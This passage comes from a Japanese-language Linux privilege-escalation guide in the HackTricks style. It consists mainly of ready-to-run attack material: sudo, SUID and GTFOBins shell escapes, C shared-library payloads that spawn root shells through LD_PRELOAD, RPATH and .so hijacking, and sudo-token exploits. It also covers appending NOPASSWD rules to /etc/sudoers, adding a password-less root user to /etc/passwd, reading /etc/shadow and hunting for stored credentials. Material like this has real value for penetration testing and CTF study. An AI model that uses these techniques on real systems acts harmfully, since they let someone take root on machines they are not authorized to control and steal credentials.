for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

一部のLinuxバージョンでは、**UID > INT\_MAX** のユーザーが権限を昇格させることができるバグが影響を受けていました。詳細情報: [こちら](https://gitlab.freedesktop.org/polkit/polkit/issues/74)、[こちら](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)、そして[こちら](https://twitter.com/paragonsec/status/1071152249529884674)。\
**エクスプロイトする**には: **`systemd-run -t /bin/bash`** を使用します。

### Groups

あなたがroot権限を与える可能性のある**何らかのグループのメンバー**であるかどうかを確認してください:

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### Clipboard

クリップボードの中に何か興味深いものがないか（可能であれば）確認してください。
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### パスワードポリシー
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 既知のパスワード

環境の**パスワードを知っている場合**、そのパスワードを使用して各ユーザーとして**ログインを試みてください**。

### Su Brute

騒音を気にしない場合、`su` と `timeout` バイナリがコンピュータに存在するなら、[su-bruteforce](https://github.com/carlospolop/su-bruteforce)を使用してユーザーのブルートフォースを試みることができます。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) も `-a` パラメーターを使用してユーザーのブルートフォースを試みます。

## 書き込み可能なPATHの悪用

### $PATH

$PATHの中のいくつかのフォルダに**書き込み可能であることがわかった場合**、異なるユーザー（理想的にはroot）によって実行されるコマンドの名前で**書き込み可能なフォルダ内にバックドアを作成する**ことによって権限昇格が可能になるかもしれません。そのコマンドは、$PATHの中であなたの書き込み可能なフォルダよりも**前に位置するフォルダからロードされていない**必要があります。

### SUDO と SUID

sudoを使用していくつかのコマンドを実行できるか、またはそれらがsuidビットを持っている可能性があります。以下を使用して確認してください：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
**意外なコマンドによって、ファイルの読み書きやコマンドの実行が可能になることがあります。** 例えば：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo設定では、パスワードを知らなくても、あるユーザーが他のユーザーの権限でコマンドを実行できることがあります。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
この例では、ユーザー `demo` は `root` として `vim` を実行できます。これで、ルートディレクトリにsshキーを追加するか、`sh` を呼び出すことで、シェルを取得することは非常に簡単になります。
```
sudo vim -c '!sh'
```
### SETENV

このディレクティブは、何かを実行する間に**環境変数を設定する**ことをユーザーに許可します:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
この例は、**HTBマシンAdmirerに基づいており**、スクリプトをrootとして実行する際に任意のpythonライブラリをロードするための**PYTHONPATHハイジャック**に**脆弱**でした：
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo 実行のバイパスパス

**Jump** を使用して他のファイルを読むか、**symlinks** を使用します。例えば sudoers ファイルには: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
**ワイルドカード**が使用されている場合 (\*)、さらに簡単です:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### コマンドパスなしのSudoコマンド/SUIDバイナリ

**sudo権限**がパスを指定せずに単一のコマンドに与えられている場合: _hacker10 ALL= (root) less_、PATH変数を変更することで悪用できます。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
このテクニックは、**suid** バイナリが**パスを指定せずに別のコマンドを実行する場合にも使用できます（常に** _**strings**_ **を使用して、奇妙なSUIDバイナリの内容をチェックしてください）**。

[実行するためのペイロード例。](payloads-to-execute.md)

### コマンドパス付きのSUIDバイナリ

もし **suid** バイナリが**パスを指定して別のコマンドを実行する場合**、suidファイルが呼び出しているコマンドと同じ名前の**関数をエクスポートする**ことを試みることができます。

例えば、suidバイナリが _**/usr/sbin/service apache2 start**_ を呼び出す場合、その関数を作成してエクスポートする必要があります：
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
以下の関数がsuidバイナリを呼び出すときに実行されます

### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

**LD\_PRELOAD** は、ローダーがCランタイムライブラリ（libc.so）を含む他の共有ライブラリよりも先にロードする、1つ以上の共有ライブラリまたは共有オブジェクトへのパスを含むオプショナルな環境変数です。これはライブラリのプリローディングと呼ばれます。

_suid/sgid_ 実行可能バイナリに対する攻撃ベクトルとしてこのメカニズムが使用されるのを避けるために、ローダーは _ruid != euid_ の場合 _LD\_PRELOAD_ を無視します。そのようなバイナリに対しては、標準パス内で_suid/sgid_ もされているライブラリのみがプリロードされます。

**`sudo -l`** の出力内で _**env\_keep+=LD\_PRELOAD**_ という文を見つけた場合、何らかのコマンドをsudoで呼び出すことができれば、権限昇格が可能です。
```
Defaults        env_keep += LD_PRELOAD
```
**/tmp/pe.c** として保存
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
```
次に、以下を使用して**コンパイルします**:
```
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最終的に、**権限を昇格**するために実行します
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
攻撃者が**LD\_LIBRARY\_PATH**環境変数を制御している場合、同様のprivescが悪用される可能性があります。なぜなら、ライブラリの検索パスを攻撃者が制御しているからです。
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUIDバイナリ – .soインジェクション

**SUID**権限を持つ変わったバイナリを見つけた場合、全ての**.so**ファイルが**正しくロードされている**かを確認することができます。そのためには以下のコマンドを実行します：
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例えば、以下のようなものを見つけた場合： _pen(“/home/user/.config/libcalc.so”, O\_RDONLY) = -1 ENOENT (ファイルまたはディレクトリがありません)_ これを悪用することができます。

コードを含むファイル _/home/user/.config/libcalc.c_ を作成します：
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
```
コンパイルするには以下を使用します:
```
```bash
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
```
And execute the binary.

## 共有オブジェクトハイジャック
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
```markdown
これで、書き込み可能なフォルダからライブラリをロードするSUIDバイナリを見つけたので、必要な名前でそのフォルダにライブラリを作成しましょう：
```
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
```
エラーが発生した場合、例えば
```
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
以下は、ライブラリが`a_function_name`という関数を持っている必要があることを意味します。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io)は、攻撃者がローカルのセキュリティ制限をバイパスするために悪用できるUnixバイナリのキュレートされたリストです。[**GTFOArgs**](https://gtfoargs.github.io/)は、コマンドに**引数のみを注入できる**場合のためのものです。

このプロジェクトは、制限されたシェルからの脱出、権限の昇格または維持、ファイルの転送、バインドおよびリバースシェルの生成、その他のポストエクスプロイトタスクを容易にするために悪用できるUnixバイナリの正当な機能を収集しています。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}' 

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

`sudo -l`にアクセスできる場合、[**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo)ツールを使用して、任意のsudoルールを悪用する方法を見つけるかどうかを確認できます。

### Sudoトークンの再利用

**sudo権限を持つユーザーとしてシェルを持っている**が、ユーザーのパスワードを知らないシナリオでは、**ユーザーが`sudo`を使用して何かコマンドを実行するのを待つ**ことができます。その後、**sudoが使用されたセッションのトークンにアクセスし、sudoとして何でも実行するために使用できます**（権限の昇格）。

権限を昇格するための要件：

* "_sampleuser_"として既にシェルを持っています
* "_sampleuser_"は**`sudo`を使用して**何かを実行しました（デフォルトでは、パスワードを入力せずに`sudo`を使用できるsudoトークンの期間は15分です）
* `cat /proc/sys/kernel/yama/ptrace_scope`が0です
* `gdb`にアクセスできます（アップロードできる可能性があります）

（`ptrace_scope`を一時的に有効にするには、`echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope`を使用するか、`/etc/sysctl.d/10-ptrace.conf`を変更して`kernel.yama.ptrace_scope = 0`を設定します）

これらの要件がすべて満たされている場合、**権限を昇格するために使用できます：** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* **最初のエクスプロイト**（`exploit.sh`）は、_/tmp_にバイナリ`activate_sudo_token`を作成します。セッションで**sudoトークンをアクティブにするために使用できます**（自動的にrootシェルは得られません、`sudo su`を実行してください）：
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* **2番目のエクスプロイト** (`exploit_v2.sh`) は _/tmp_ に **root所有のsetuid付き** shシェルを作成します
```bash
bash exploit_v2.sh
/tmp/sh -p
```
* **3番目のエクスプロイト** (`exploit_v3.sh`) は**sudoersファイルを作成し**、**sudoトークンを永続的にし、すべてのユーザーがsudoを使用できるようにします**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<ユーザー名>

フォルダやフォルダ内に作成されたファイルに**書き込み権限**がある場合、[**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) バイナリを使用して**ユーザーとPIDのsudoトークンを作成**できます。\
例えば、_/var/run/sudo/ts/sampleuser_ ファイルを上書きでき、PID 1234でそのユーザーとしてシェルを持っている場合、パスワードを知らなくても次のようにして**sudo権限を取得**できます：
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers、/etc/sudoers.d

ファイル `/etc/sudoers` と `/etc/sudoers.d` 内のファイルは、誰が `sudo` を使用できるか、どのように使用できるかを設定します。これらのファイルは**デフォルトではユーザー root とグループ root のみが読むことができます**。\
**もし**このファイルを**読む**ことができれば、**興味深い情報を得る**ことができるかもしれませんし、ファイルに**書き込む**ことができれば、**権限昇格**を行うことができるでしょう。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
If you can write you can abuse this permission

書き込み権限があれば、この権限を悪用できます
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
これらの権限を悪用する別の方法：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` バイナリの代替として、OpenBSDの `doas` があります。`/etc/doas.conf` でその設定を確認することを忘れないでください。
```
permit nopass demo as root cmd vim
```
### Sudo ハイジャック

**ユーザーが通常マシンに接続し、`sudo`を使用して権限を昇格する**ことを知っていて、そのユーザーコンテキスト内でシェルを取得した場合、rootとしてコードを実行し、その後ユーザーのコマンドを実行する**新しいsudo実行可能ファイルを作成**できます。次に、ユーザーがsudoを実行するときに、あなたのsudo実行可能ファイルが実行されるように、ユーザーコンテキストの$PATHを**変更します**（例えば、.bash\_profileに新しいパスを追加する）。

ユーザーが別のシェル（bashではない）を使用している場合は、新しいパスを追加するために他のファイルを変更する必要があります。例えば、[sudo-piggyback](https://github.com/APTy/sudo-piggyback)は`~/.bashrc`、`~/.zshrc`、`~/.bash_profile`を変更します。別の例は[bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)で見つけることができます。

または、次のようなものを実行します：
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共有ライブラリ

### ld.so

ファイル `/etc/ld.so.conf` は**ロードされた設定ファイルがどこから来たかを示します**。通常、このファイルには次のパスが含まれています: `include /etc/ld.so.conf.d/*.conf`

これは `/etc/ld.so.conf.d/*.conf` の設定ファイルが読み込まれることを意味します。この設定ファイルは**検索される** **ライブラリ**がある他のフォルダーを**指します**。例えば、`/etc/ld.so.conf.d/libc.conf` の内容は `/usr/local/lib` です。**これはシステムが `/usr/local/lib` 内のライブラリを検索することを意味します**。

何らかの理由で**ユーザーが書き込み権限を持っている**場合、以下のパスに示されている: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` 内の任意のファイル、または `/etc/ld.so.conf.d/*.conf` 内の設定ファイル内の任意のフォルダー、彼は権限昇格を行うことができるかもしれません。\
次のページで**この誤設定をどのように悪用するか**について見てみましょう:

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
```
プログラムがこの場所で `RPATH` 変数で指定されているように、`/var/tmp/flag15/` にライブラリをコピーすると、それが使用されます。
```
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
```markdown
次に、`/var/tmp` に悪意のあるライブラリを `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` を使って作成します。
```
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linuxのcapabilitiesは、プロセスに**root権限のサブセットを提供します**。これにより、root **権限をより小さく、区別された単位に分割します**。これらの単位はそれぞれ、プロセスに独立して付与することができます。この方法で、権限のフルセットが減少し、悪用のリスクが減少します。\
以下のページを読んで、capabilitiesについて**詳しく学び、それらをどのように悪用するかを学んでください**：

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## ディレクトリの権限

ディレクトリ内で、**"実行"のビット**は、影響を受けるユーザーがフォルダに"**cd**"できることを意味します。\
**"読み取り"**ビットはユーザーが**ファイルをリスト**できることを意味し、**"書き込み"**ビットはユーザーが新しい**ファイル**を**削除**および**作成**できることを意味します。

## ACLs

ACL（アクセス制御リスト）は、任意の権限の第二レベルであり、**標準のugo/rwx**を上書きすることがあります。正しく使用された場合、たとえばファイルの所有者でもグループの所有者でもない特定のユーザーにアクセスを許可または拒否することによって、ファイルやディレクトリへのアクセス設定に**より良い粒度を提供できます**（[**こちら**](https://linuxconfig.org/how-to-manage-acls-on-linux)から）。\
ユーザー"kali"にファイルの読み取りと書き込みの権限を**与える**：
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**システムから特定のACLを持つファイルを取得する:**
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## オープンシェルセッション

**古いバージョン**では、異なるユーザー（**root**）の**シェル**セッションを**ハイジャック**することができます。\
**最新バージョン**では、**自分のユーザー**のscreenセッションにのみ**接続**できます。しかし、セッション内に**興味深い情報**が見つかるかもしれません。

### screenセッションのハイジャック

**screenセッションのリスト**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../.gitbook/assets/image (130).png>)

**セッションにアタッチする**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux セッションのハイジャック

これは**古い tmux バージョン**での問題でした。非特権ユーザーとして root によって作成された tmux (v2.1) セッションをハイジャックすることはできませんでした。

**tmux セッションのリスト**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
```markdown
![](<../../.gitbook/assets/image (131).png>)

**セッションにアタッチする**
```
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
**HTBのValentine boxを例に挙げてください。**

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006年9月から2008年5月13日までの間にDebianベースのシステム（Ubuntu、Kubuntuなど）で生成されたすべてのSSLおよびSSHキーは、このバグの影響を受ける可能性があります。\
このバグは、これらのOSで新しいsshキーを作成する際に**32,768の変動しか可能ではなかった**ために発生します。これは、すべての可能性を計算でき、**ssh公開キーを持っていれば対応する秘密キーを探すことができる**ことを意味します。計算された可能性はこちらで見つけることができます：[https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH 興味深い設定値

* **PasswordAuthentication:** パスワード認証が許可されているかどうかを指定します。デフォルトは`no`です。
* **PubkeyAuthentication:** 公開鍵認証が許可されているかどうかを指定します。デフォルトは`yes`です。
* **PermitEmptyPasswords**: パスワード認証が許可されている場合、サーバーが空のパスワード文字列を持つアカウントへのログインを許可するかどうかを指定します。デフォルトは`no`です。

### PermitRootLogin

rootがsshを使用してログインできるかどうかを指定します。デフォルトは`no`です。可能な値：

* `yes`: rootはパスワードと秘密鍵を使用してログインできます
* `without-password`または`prohibit-password`: rootは秘密鍵を使用してのみログインできます
* `forced-commands-only`: Rootは秘密鍵を使用し、コマンドオプションが指定されている場合のみログインできます
* `no` : いいえ

### AuthorizedKeysFile

ユーザー認証に使用できる公開鍵を含むファイルを指定します。`%h`のようなトークンを含むことができ、これはホームディレクトリに置き換えられます。**絶対パス**（`/`で始まる）を指定することも、**ユーザーのホームからの相対パス**を指定することもできます。例えば：
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
その設定は、ユーザー "**testusername**" の**プライベート**キーでログインしようとすると、sshがあなたのキーの公開キーを `/home/testusername/.ssh/authorized_keys` と `/home/testusername/access` にあるものと比較することを示します。

### ForwardAgent/AllowAgentForwarding

SSHエージェントフォワーディングにより、サーバーにキー（パスフレーズなし！）を残す代わりに、**ローカルのSSHキーを使用する**ことができます。したがって、ssh経由で**ホストにジャンプ**し、そこから**別のホストにジャンプ**する際に、**初期ホスト**にある**キー**を**使用**することができます。

このオプションを `$HOME/.ssh.config` に次のように設定する必要があります：
```
Host example.com
ForwardAgent yes
```
以下は、`Host`が`*`の場合、ユーザーが異なるマシンにジャンプするたびに、そのホストが鍵にアクセスできることを指摘しています（これはセキュリティ問題です）。

ファイル`/etc/ssh_config`はこの**オプション**を**上書き**して、この設定を許可または拒否することができます。
ファイル`/etc/sshd_config`は、キーワード`AllowAgentForwarding`を使用してssh-agentの転送を**許可**または**拒否**することができます（デフォルトは許可）。

環境内でForward Agentが設定されていることがわかった場合、以下のページを読んでください。**権限昇格に悪用できる可能性があります**：

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## 興味深いファイル

### プロファイルファイル

ファイル`/etc/profile`および`/etc/profile.d/`以下のファイルは、**ユーザーが新しいシェルを実行するときに実行されるスクリプト**です。したがって、これらのいずれかを**書き込むか変更できる場合、権限を昇格させることができます**。
```bash
ls -l /etc/profile /etc/profile.d/
```
不審なプロファイルスクリプトが見つかった場合、**機密情報**がないか確認する必要があります。

### Passwd/Shadow ファイル

OSによっては、`/etc/passwd` と `/etc/shadow` ファイルが異なる名前を使用していたり、バックアップが存在する場合があります。したがって、**すべてを見つけ出し**、ファイル内に**ハッシュがあるかどうか**、**読み取り可能か**を確認することが推奨されます：
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
一部の場合、`/etc/passwd`（または同等の）ファイル内に**パスワードハッシュ**が見つかることがあります
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 書き込み可能な /etc/passwd

まず、以下のコマンドのいずれかを使用してパスワードを生成します。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
```
次にユーザー `hacker` を追加し、生成されたパスワードを追加します。
```
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

これで `su` コマンドを `hacker:hacker` で使用できます。

または、以下の行を使用してパスワードなしでダミーユーザーを追加することができます。\
警告: これにより、マシンの現在のセキュリティが低下する可能性があります。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
```markdown
注: BSDプラットフォームでは、`/etc/passwd` は `/etc/pwd.db` と `/etc/master.passwd` に位置し、`/etc/shadow` は `/etc/spwd.db` に名前が変更されています。

**機密ファイルに書き込みができるか**を確認する必要があります。例えば、**サービス設定ファイル**に書き込むことはできますか？
```
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例えば、マシンが**tomcat**サーバーを実行しており、**/etc/systemd/内のTomcatサービス設定ファイルを変更できる**場合、以下の行を変更できます：
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
次のバックドアは、tomcatが次に起動されたときに実行されます。

### フォルダの確認

以下のフォルダにはバックアップや興味深い情報が含まれている可能性があります: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root**（おそらく最後のものは読めないでしょうが、試してみてください）
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 変な位置/所有されたファイル
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 最終更新から数分以内の変更されたファイル
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB ファイル
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history、.sudo\_as\_admin\_successful、profile、bashrc、httpd.conf、.plan、.htpasswd、.git-credentials、.rhosts、hosts.equiv、Dockerfile、docker-compose.yml ファイル
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隠しファイル
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH内のスクリプト/バイナリ**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type -f -executable 2>/dev/null; done
```
### **ウェブファイル**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **バックアップ**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### パスワードが含まれている可能性のある既知のファイル

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)のコードを読んでください。これは**パスワードが含まれている可能性のあるいくつかのファイルを検索します**。\
**もう一つの興味深いツール**は、Windows、Linux、Macのローカルコンピュータに保存されている多くのパスワードを取得するために使用されるオープンソースアプリケーションである[**LaZagne**](https://github.com/AlessandroZ/LaZagne)です。

### ログ

ログを読むことができれば、**興味深い/機密情報を内部で見つけることができる**かもしれません。ログが奇妙であればあるほど、おそらくそれはより興味深いものになります。\
また、いくつかの「**悪い**」設定された（バックドアがあるかもしれない）**監査ログ**は、この投稿で説明されているように監査ログ内に**パスワードを記録**することを許可するかもしれません: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/)。
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**ログを読むためには、グループ** [**adm**](interesting-groups-linux-pe/#adm-group) が非常に役立ちます。

### シェルファイル
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### 汎用クレデンシャル検索/正規表現

ファイル名に「**password**」という単語が含まれているか、または**内容**内に含まれているかどうかを確認し、ログ内のIPやメールアドレス、ハッシュの正規表現もチェックする必要があります。\
ここではそれらの方法をすべてリストアップしませんが、興味がある場合は、[**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh)が実行する最後のチェックを確認できます。

## 書き込み可能なファイル

### Pythonライブラリのハイジャック

